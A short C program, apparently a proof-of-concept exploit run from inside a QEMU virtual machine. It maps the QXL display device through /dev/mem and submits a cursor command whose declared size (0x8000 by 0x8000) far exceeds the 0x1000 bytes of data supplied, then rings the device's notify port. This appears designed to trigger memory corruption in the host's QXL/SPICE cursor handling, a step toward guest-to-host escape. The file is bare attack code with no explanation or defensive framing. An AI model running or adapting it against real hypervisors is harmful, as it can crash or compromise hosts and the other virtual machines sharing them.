#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <stdint.h>
#include "qxl_dev.h"
#include <sys/io.h>
#include <string.h>


int main(int argc,char** argv){


	iopl(3);
	int fd = open("/dev/mem",2);
	struct qxl_ram_header *ram = (struct qxl_ram_header*) mmap(0,0x8000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0xf4000000+0x3ffe000);
	struct qxl_cursor_cmd *cmd = (struct qxl_cursor_cmd*) mmap(0,0x8000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0xf4000000+0x3ff1000);
	struct qxl_cursor *cursor = (struct qxl_cursor*) mmap(0,0x8000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0xf4000000+0x3ff2000);
	cmd->type = QXL_CURSOR_SET;
	cmd->u.set.shape = ( 1ULL<<(64-8) ) + 0x3ff2000;
	cursor->header.width = 0x8000;
	cursor->header.height = 0x8000;
	cursor->header.type = SPICE_CURSOR_TYPE_ALPHA;
	cursor->chunk.data_size = 0x1000;
	cursor->chunk.prev_chunk = 0;
	cursor->chunk.next_chunk = 0;
	memset(cursor->chunk.data,'a',0x1000);
	int idx = ram->cursor_ring_hdr.prod;
	ram->cursor_ring[idx&0x1f].data = ( 1UL<<(64-8) ) + 0x3ff1000;
	ram->cursor_ring[idx&0x1f].type = 0;
	ram->cursor_ring_hdr.prod++;
	outb(0,0xc040+QXL_IO_NOTIFY_CURSOR);	
	
}
